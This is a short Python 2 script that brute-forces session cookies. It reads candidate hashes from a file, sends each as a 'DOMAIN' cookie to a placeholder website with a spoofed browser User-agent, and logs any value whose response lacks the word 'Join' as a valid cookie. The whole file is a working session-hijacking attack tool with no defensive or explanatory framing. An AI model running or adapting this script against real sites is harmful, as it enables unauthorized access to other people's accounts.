import pprint
import urllib2

file = open('hash.txt', 'r')
hashes = file.readlines()
#pprint.pprint(x)
for hash in hashes:         
	print 'Current hash :', hash
	opener = urllib2.build_opener()
	opener.addheaders = [('User-agent', 'Mozilla/5.0')]
	opener.addheaders.append(('Cookie', 'DOMAIN=%s' %hash))
	f= opener.open('https://www.your_website.com') 
	body = f.read()
	text_file = open("log.txt", "a+")
	text_file_valid = open("valid_cookie.txt", "a+")
	if "Join" in body:
		print 'Not valid cookie..'
		text_file.write("Not valid cookie: %s" % hash)		
	else:
		print '------->YES..!!! VALID COOKIE: %s' %hash
		text_file_valid.write("Yes..! VALID COOKIE: %s" % hash)
	   
text_file.close()
text_file_valid.close()
